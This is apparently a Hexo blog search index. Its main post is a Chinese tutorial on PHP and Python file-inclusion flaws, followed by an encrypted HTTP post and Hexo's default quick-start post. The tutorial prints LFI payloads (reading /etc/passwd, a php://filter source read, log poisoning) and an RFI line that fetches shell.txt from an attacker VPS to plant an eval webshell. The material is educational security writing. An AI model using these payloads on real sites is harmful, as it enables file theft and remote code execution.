<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>任意文件包含漏洞</title>
      <link href="/2021/08/18/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/08/18/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>任意文件读取漏洞是通过一些手段可以<strong>读取服务器上开发者不允许读到的文件</strong>。<br>主要包括的文件类型有：</p><ol><li>服务器的各种配置文件</li><li>以文件形式存储的密钥</li><li>服务器信息<ul><li>正在执行的进程信息</li><li>……</li></ul></li><li>历史命令</li><li>网络信息</li><li>应用源码及二进制程序</li><li>……</li></ol><p>以上文件内容通过任意文件读取漏洞可以作为信息收集的强有力的补充。</p><p>任意文件读取漏洞的成因：</p><ul><li>开发人员对于意外情况考虑不足所致，从本质上来看文件读取漏洞的存在与不是语言本身的问题。</li><li>对于<strong>Web应用框架或中间</strong>件的二次开发中不了解其<strong>安全机制</strong>，造成任意文件读取漏洞的形成。<ul><li>主要漏洞挖掘的方式是通过“调用链”进行溯源。</li></ul></li><li>由<strong>Web Server自身的问题或不安全的服务器配置</strong>导致的任意文件读取漏洞<ul><li><strong>Web Server运行的基本机制</strong>是从服务器中读取代码或资源文件，再把代码类文件传送给解释器或CGI程序执行，然后将执行的结果和资源文件反馈给客户端用户，而存在于其中的<strong>众多文件操作很可能被攻击者干预</strong>，进而造成诸如非预期读取文件、错误地把代码类文件当作资源文件等情况的发生。</li></ul></li></ul><h2 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h2><h3 id="Web语言相关"><a href="#Web语言相关" class="headerlink" title="Web语言相关"></a>Web语言相关</h3><p>不同Web语言由于语言上的特性，导致存在任意文件包含漏洞时的漏洞触发点不同。</p><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p>作为世界上最好的语言，PHP的任意文件读取漏洞触发点可以分为</p><h5 id="函数相关"><a href="#函数相关" class="headerlink" title="函数相关"></a>函数相关</h5><ol><li><p>PHP标准函数中与文件操作相关的函数</p><ul><li>file_get_contents()</li><li>file()</li><li>fopen()</li><li>与文件包含相关的函数：</li><li><ul><li>include()</li></ul></li><li><ul><li>required()</li></ul></li><li><ul><li>……</li></ul></li><li>系统命令执行函数</li><li><ul><li>system()</li></ul></li><li><ul><li>exec()</li></ul></li><li><ul><li>……</li></ul></li></ul></li><li><p>PHP拓展中与文件相关的函数<br>例如：</p></li></ol><ul><li>PHP-curl拓展</li><li>……</li></ul><h5 id="协议（Wrapper）相关"><a href="#协议（Wrapper）相关" class="headerlink" title="协议（Wrapper）相关"></a>协议（Wrapper）相关</h5><p>与其他语言不同，PHP打开文件的方式不仅仅是简单的路径，而是通过<strong>文件流</strong>的方式打开文件。<br>可以简单的理解为PHP提供了一套协议来完成文件的打开。最有特色的就是：<code>php://</code>协议。</p><p>PHP中还提供了接口供开发者编写自己的Warrper（stream_wrapper_register）</p><h5 id="Filter机制"><a href="#Filter机制" class="headerlink" title="Filter机制"></a>Filter机制</h5><p>Filter机制的作用是对目前的Warrper进行一定的处理。<br>对于自定义的Wrapper而言，Filter需要开发者通过stream_filter_register进行注册。而PHP内置的一些Wrapper会自带一些Filter。</p><p>假设服务端include函数的路径参数可控，正常情况下它会将目标文件当作PHP文件去解析，如果解析的文件中存在“&lt;？php”等PHP的相关标签，那么标签中的内容会被作为PHP代码执行，这样php文件的内容就无法作为可视文本形式泄露，通过<strong>使用Filter可以避免这种情况</strong>。</p><p>比较常见的<strong>Base64相关的Filter可将文件流编码成Base64</strong>的形式，这样读取的文件内容中就不会存在PHP标签。</p><p>如果服务端开启了远程文件包含选项allow_url_include，我们就可以直接执行远程PHP代码。</p><p>当然，这些PHP默认携带的Wrapper和Filter都可以<strong>通过php.ini禁用</strong>。</p><h5 id="PHP文件包含的实际情况"><a href="#PHP文件包含的实际情况" class="headerlink" title="PHP文件包含的实际情况"></a>PHP文件包含的实际情况</h5><ol><li>文件路径前面可控后面不可控<ul><li>使用<code>%00</code>截断，将不可控后部截掉。</li><li>若存在文件上传功能可尝试使用zip或phar进行文件包含进而执行PHP代码。</li></ul></li><li>文件路径后面可控前面不可控<ul><li>使用<code>../</code>进行目录穿越，进而直接读取文件。</li><li>如果服务端是利用include等文件包含类的函数，则无法读取PHP文件中的PHP代码。</li></ul></li><li>文件路径中间可控<ul><li>类似第一种，但是不能使用Wrapper进行文件包含。</li></ul></li></ol><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>Python的Web应用更多地倾向于通过其自身的模块启动服务，同时<strong>搭配中间件、代理服务</strong>将整个Web应用呈现给用户。</p><p>用户和Web应用交互的过程<strong>本身就包含对服务器资源文件的请求</strong>，所以容易出现非预期读取文件的情况。</p><p>因此，层出不穷的Python某框架任意文件包含漏洞也是因为<strong>缺乏统一的资源文件交互的标准</strong>。</p><ol><li><p>非预期请求<br>Python的任意文件包含漏洞经常出现在请求静态资源文件的部分，也就是最后读取文件内容的open函数，原因是开发者常常忽略Python函数的feature。</p></li><li><p>目录穿越<br>很多开发者通过判断用户传入的路径<strong>不包含</strong><code>.</code>来保证用户在读取资源时不会发生目录穿越，随后将用户的输入代入<code>os.path.join</code>的第二个参数，<strong>但是如果用户传入<code>/</code>，则依然可以穿越到根目录，进而导致任意文件包含。</strong></p></li></ol><p>很多涉及文件操作的应用也很有可能因为滥用open函数、模板的不当渲染导致任意文件包含。</p><p>比如，<strong>将用户输入的某些数据作为文件名的一部分</strong>（常见于认证服务或者日志服务）存储在服务器中，在取文件内容的部分也通过<strong>将经过处理的用户输入数据作为索引去查找相关文件</strong>，这就给了攻击者一个进行目录穿越的途径。</p><ol start="3"><li><p>不安全解压导致文件覆盖</p><ul><li>Python开发者调用不安全的解压模块进行压缩文件解压，而导致文件解压后可进行目录穿越。解压文件时的目录穿越的危害是覆写服务器已有文件（特别是配置文件）</li><li>攻击者<strong>构造软链接</strong>放入压缩包，解压后的内容会直接指向服务器相应文件，攻击者访问解压后的链接文件会返回链接指向文件的相应内容。</li></ul></li><li><p>其他<br>此外，Python的模板注入、反序列化等漏洞都可造成一定程度的任意文件包含，当然，其<strong>最大危害仍然是导致任意命令执行</strong>。</p></li></ol><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><h4 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h4><h3 id="中间件、服务器相关"><a href="#中间件、服务器相关" class="headerlink" title="中间件、服务器相关"></a>中间件、服务器相关</h3><ol><li>中间件、服务器的错误配置导致文件读取漏洞</li><li>数据库的不恰当权限管理导致结合<code>load_file()</code>函数（或者load data infile）导致任意文件包含漏洞</li><li>上传软链接实现任意文件包含</li><li>……</li></ol><h3 id="客户端相关"><a href="#客户端相关" class="headerlink" title="客户端相关"></a>客户端相关</h3><p>客户端也存在文件包含漏洞，大多是<strong>基于XSS漏洞包含本地文件</strong>。</p><ol><li>浏览器/Flash XSS</li><li>MarkDown语法解析器XS</li></ol><p>文件包含漏洞的产生原因是 PHP 语言在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p><p>主要有两种情况：</p><ol><li>当被包含的文件在服务器本地时，就形成了本地文件包含漏洞。</li><li>服务器远程包含一个恶意文件时，就形成了远程文件包含漏洞。</li></ol><h2 id="漏洞利用及其利用条件"><a href="#漏洞利用及其利用条件" class="headerlink" title="漏洞利用及其利用条件"></a>漏洞利用及其利用条件</h2><h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>Local File Include(本地文件包含漏洞)</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol><li>include()等函数通过<strong>动态变量的方式引入包含文件</strong>； </li><li><strong>用户能够控制</strong>该动态变量。</li></ol><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><ol><li><p>读取敏感文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[url]?arg=/etc/passwd </span><br></pre></td></tr></table></figure><p>通过对敏感文件的读取，获得服务器信息，可作为信息收集的强有力补充。</p></li><li><p>利用封装协议读取源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[url]?arg=php://filter/read=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure><p>通过对php伪协议中的filter机制的利用，绕过对php文件的解析，获得源码的base64编码，解码后可查看源码</p></li><li><p>包含图片GetShell<br>在上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码</p></li><li><p>截断包含<br>同前面介绍的情况类似</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 文件路径前面可控后面不可控</span><br><span class="line"><span class="bullet">-</span> 使用<span class="code">`%00`</span>截断，将不可控后部截掉。</span><br><span class="line"><span class="bullet">-</span> 若存在文件上传功能可尝试使用zip或phar进行文件包含进而执行PHP代码。</span><br><span class="line"><span class="bullet">1.</span> 文件路径后面可控前面不可控</span><br><span class="line"><span class="bullet">-</span> 使用<span class="code">`../`</span>进行目录穿越，进而直接读取文件。</span><br><span class="line"><span class="bullet">-</span> 如果服务端是利用include等文件包含类的函数，则无法读取PHP文件中的PHP代码。</span><br><span class="line"><span class="bullet">1.</span> 文件路径中间可控</span><br><span class="line"><span class="bullet">-</span> 类似第一种，但是不能使用Wrapper进行文件包含。</span><br></pre></td></tr></table></figure></li><li><p>包含Apache日志Getshell</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">条件：知道日志文件access.log的存放位置 ，默认位置：/var/log/httpd/access.log</span><br></pre></td></tr></table></figure><p><code>access.log</code>文件记录了客户端每次请求的相关信息； 当我们访问一个不存在的资源时<code>access.log</code>文件仍然会记录这条资源信息。</p><p>如果目标网站存在文件包含漏洞，但是没有可以包含的文件时，我们就可以尝试访问<code>http://www.vuln.com/&lt;?php phpinfo(); ?&gt;</code></p><p>Apache会将这条信息记录在<code>access.log</code>文件中，这时如果我们访问<code>access.log</code>文件，就会触发文件包含漏洞。理论上是这样的，但是实际上却是输入的代码被转义无法解析。</p><p>攻击者可以通过<code>burpsuite</code>进行抓包在http请求包里面将转义的代码改为正常的测试代码就可以绕过。这时再查看Apache日志文件，显示的就是正常的测试代码。</p><p>这时访问：<code>http://www.vuln.com/index.php?arg=/var/log/httpd/access.log</code>，即可成功执行代码</p></li></ol><h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><p>Remote File Include(远程文件包含漏洞 )</p><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p><code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。</p><h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><ol><li>远程包含WebShell<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg=http://攻击者的VPS/shell.txt</span><br><span class="line"><span class="comment">#会在网站目录生成名为 shell.php 的一句话木马</span></span><br></pre></td></tr></table></figure>shell.txt内容为<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fputs(fopen(<span class="string">&#x27;./shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>……</li></ol><p>在PHP中，文件包含用到的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()<span class="comment">//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span></span><br><span class="line">inclue_once()<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>()<span class="comment">//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。</span></span><br><span class="line"><span class="keyword">require_once</span>()<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h2><ol><li><a href="https://wiki.wgpsec.org/knowledge/web/fileincludes.html#php%E4%B8%AD%E7%9A%84%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE-%E4%BC%AA%E5%8D%8F%E8%AE%AE">关于php伪协议以及filter机制（外链）</a></li><li><a href="null">PHP代码审计（未上传）</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 任意文件包含漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议 简单了解HTTP协议</title>
      <link href="/2021/08/18/HTTP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2021/08/18/HTTP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d23cd51cd1c4331482e8a54cae7969de455b96b6aa5c6666902334b488f48632">4af8291d7d4bfe809382abee478622f730fb2cf3a5b3f91739843be8e8bb47a0d1eca2adcd9f332d506bab1ba2ff6fe120b93a3ae2187e17989cfd20d60941a6a2941ac1c07142ac4f3289a9070a30c266b70915bd0d36b4af046e5b32ccf598e7d7f15518046cb8b4ddbc4dc6662ca247dc6fb12b7de799be490c9c7629c49cf1d787557629b6cd8dc1750713126dac2947b3994366994ce41d48ca97e183ff132b03f368ddb33547b776600cde586262b84da23e3deedbc824512b5e2c56a77ba6f9ee118691d1ab9ddc2e38fe6a1ed0f62021dba01ae44c16e48f5113d4e9ac4f178af6a24cb47b10243c7d51456ff891ddb47bd665ddcc4d4151e93c8263c9b7a734979f96ea95321dcc55aea89ce1f7035db59f59c6152ce3744266fecd2c044a53babcb7b7c3b9b058288f7c7d2411ebcebe7f1c4571eaf65ffa91a1a8a27455459264dbf09275a50e92fc1b3678ea1c658471526aab49334db4eea118608970719edca91a5852eedbef92f080ddc75affbe1863b440c7f4fef844812f4322a3eeae4361dc5df67ab031556bbd03b9426b4c7d56e3046e117184813ee2548e4cc3a3297c065f281e497a64c9bb155d8156734bd3d561b07f9d7d1d20c08102f7bea7fe487faa51d928edb82483c17422cbd7813c9687252d79343fa914afe6de26d362d98f0df90dc81e8a64bcc551b08a65ff348f68a8135ed067e95ca52924b1c69c0860c9830853c5b55cdd88606cdc484473ecc8be63687f81ceeac61356397da3b127aa5252d8f50230c021c9020d5e28ad1231aa1062c8aeadc8ce798e844e369605107b0e3f7125dfb0f497dcbfdc23fb75ad3c334c36a44921f51f680154a1148d91990bb6bf917397bb9034adac273933eca89f3bb935625913844ad5adddd7523e9439e068f39ed5a5092381c54d8a3e17460ee8486abe6a5a97f6e19ab29b1d880ebf6f2a3422f32dedcaca291491ef7f141670ee97f656caf01cc9a6dad00b02a188af38400c769643aa04e89fae37673bec7ecb81326e7d4959eb5caf873886380e6661b4aaf0bc7f79c8db5b3a2321d44a71513b480fb678f64755427f4f7dd222de8a4a8b2cfae642d9adec3f0d2ee3c145bf1bb3979834eab12dcb4d3fd22f2f276b38f74af132041c21cd1d9767a82dd4616c17f4078889f964205454ce7a041d09dea95b847e975f9c327ac2fa166e2668371fbb3d41df33eb3c94a6a8e43e4ed152986bbef20ac5962873a91802e5aff76475b0d21960c6c4974fc23bb8d9a7142f83ff00c058376faf1e237429346af0aebd128fd6e2c2cd2093e69a6d2cc3703069602f29d3c7c93d3259bd2cb641ec1a0688bcc0426bfd45bb996620c1b33aaf2d5bafa1dcdac17cbcc1d40e9abb503ba6478f7a222ca37cde0ae23d8e0647deb40df08dbece6d178c09919e797560e829f9c53af6b376222deea7f1a035eca67d6230672360c7d71494fce3b2d1ea8c04444d69d3478327b635508d5fbb77e710af7fe05825460de21915049978c9f3ac37b67a62c936b3526f517e150fafa203cb3d00bfa1f6146fd71525c3881df3cd5138f2220963fc030f4dab34dfbaf80ec10a467640bfa89175e6205bf8e0a3030d45ea66263663add6fea40f2581faf86c5cbb8f3a371fe87893dbb77467fd29c90bc4b06924821aaec5778266fb61b61bd7a43c806f4ae684d022362784eea73af1277c54722ad3401ec38432c218c73cb0230b4ed40fa434f560b2c7b06515a5e0e6f2db812c6e2cb3729f7f50d6022fb76d3ebd58f66e89137c33b1ebc6b2f4f5d0aa477d4cc24ee46f6bc80588d1ce80280472dc21ed3673ea84d6f5906580f7e2afd3e2860488113a10bd17af987e36d193576e72abbdbe000e268a1cb792337b307ee7529b0e890c9738a0b7cecc68c774f02932379f172d2b3a53e12bfe26b637ff9d1dd5260f70439c4855ea98638ba41ac85604abf18c9768da38aa2596179fce4f6dc1f1281f68c0e2e548f508f06f4c28542b48c7c313a8bd319a6ebe188479570e9cc46f1269a3819db145b08a6068e00cc70e5c9d4fa7f26f974d7926b9d40351dd2dfbe7784897dd826acb58840ff10ecf275927be986fb098d408eb5ada3af6e6c484b4206c5edfde96262b9969a4b0e1b260468b9ecf61329558170831cdf30710cccd26b1254524eb2efa7cc29d94f85ac00f26e192678119470d4ebfa21922dfd0db7709ae30663b0b9b2754b7a3e24ad2391b0497762ddbd3a53aeb92d702dd4a137c0dc3d7c0f769e6e6cff9c3e854719b48fc17c7f06a1c520b085650946675883db02b8103d9ffc0a80d5bff20afd1ed8ba748c632a7503f7d89ce6386faa0473a14cdaef3c11d05adedd35d9dd33b39afcafe1e32750889ad93d8b344eeca62db950e75280ce0c2b77b27a43e94a687520d5978a7754a559e082e2eae61c5a45aa0aacbf7f47f91afcae1f4b2bca59434fe3961e199b9dd0115945afab46ebb1815238ca99b097256e9adc882cc6a74b479a778b42236c6390a328c800778927887b233baf0e1d45fe0c7a7c52b39aa10344e18fded1346d39825bae1e3c45eecd33ed94f31558514626adfa997a839e50a7c53d5e47f3e48427968b07d7d9ed9b8ead8fa2339770367a792fd30442ce2534b9e99a310eee16e673a5396874bc2bf3fb79a075b1ade3cbc63f1cc037b3c473c87fe5f27e0cb15b9021581fb4a3592da35068d0c7005d4824b21da3e318a764699321e62d5009878b650dfcd187fc7b3d1cc0c34e93c3657f27f864522d3ef56fd65baf9f9a76e115b85a89fcd6caf5560a1efc91f3eaec5f575744d6afa1b00b858681419f497fb44f62b055f033274ec8b1f697a32f73c8bc57ba8237d61c827eb5440cca0e0927e697c5454f9afde67a6afd404f2ad35999d739479bc84b4649dba71db08d9a8e116f7c074032e8a7aea4565adcac9dccc37a28bd5fc9433f53c24b02348c6fe6e2f33d002c1662866238ba2ecb2e3c80ebef1e38d8bcc64725d702834691d163d51a18016b0a84c8e87e02bc3386b60e71870f19e290f834a6ab18ec210694705bf6680643c98bd507f0ffb9dfcb2590e64f34913a2ac8ca599c0e3d5047bad8e058b7bf49195389ca5629ba5e5e98c2b98da6c6abbe51304a29482e8c95d1e8e6b94eb089e2f6422cf72fa570718bc39260b74507c2de3b34b7ccbbd48653c4d6f2a0047aed480cc8d5fd4c2bcf18f3e451c2b1e53a5efd0e7ab28db5e1a5cf1722f7c95ac4db53f455a50f4394c3b9df70856620a9e727ac4ed9db5821ac998419f60b2d2df9c40025c35a321ff0b0a1f6c63a19e8169ad1ca24c67f84f3c82f50f16ce13d1724dcb1eb7861feccb79013354d72c7cb6606360a6bcd16002425d2bf47ea88949711371f62b350a6a0802859a9f63a64593ab7641b007c0df25f164b53afff0e23a2dcb8feca5f7f50454d265edb647315424c5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo的一些简单操作</title>
      <link href="/2021/08/17/Hexo%E6%93%8D%E4%BD%9C/"/>
      <url>/2021/08/17/Hexo%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 操作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
